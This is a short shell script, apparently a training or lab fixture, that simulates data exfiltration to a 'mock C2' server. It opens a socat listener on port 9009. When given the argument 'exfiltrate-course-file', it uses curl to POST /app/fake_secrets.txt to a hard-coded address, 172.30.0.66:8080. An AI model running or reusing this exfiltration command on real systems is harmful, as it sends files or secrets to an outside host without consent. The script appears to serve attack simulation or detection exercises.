#!/bin/sh
set -eu

# Start a harmless TCP listener on port 9009
socat TCP-Listen:9009,bind=0.0.0.0,reuseaddr,fork SYSTEM:"echo 'Mock listener connected'" &

LISTENER_PID=$!

# Perform POST if exact argument (exfiltrate-course-file) is provided
if [ "$#" -eq 1 ] && [ "$1" = "exfiltrate-course-file" ]; then
	# Send fake secret file to mock C2 
	curl --fail --silent --show-error --request POST --header "Content-Type: application/octet-stream" --data-binary @/app/fake_secrets.txt http://172.30.0.66:8080/

	echo "Mock file transfer completed."
else 
	echo "Listener remains active"
	wait "$LISTENER_PID"
fi
